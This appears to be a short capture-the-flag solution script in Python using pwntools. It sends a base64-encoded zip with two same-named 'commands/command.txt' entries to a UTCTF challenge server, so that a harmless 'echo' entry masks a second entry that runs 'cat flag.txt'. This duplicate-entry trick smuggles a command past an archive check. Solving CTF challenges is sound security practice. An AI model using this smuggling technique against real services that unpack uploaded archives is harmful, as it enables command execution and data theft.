from pwn import *
import base64
import zipfile

conn = remote("betta.utctf.live", 12748)

exploit_zip = zipfile.ZipFile("exploit.zip", mode="w")
exploit_zip.writestr("commands/command.txt", "echo 'Hello World!'")
exploit_zip.writestr("commands/command.txt", "cat flag.txt")
exploit_zip.close()

zip_file = open("exploit.zip", "rb")
zip_contents = zip_file.read()
zip_b64 = base64.b64encode(zip_contents)
conn.sendline(zip_b64)
print(conn.recvline())
conn.close()
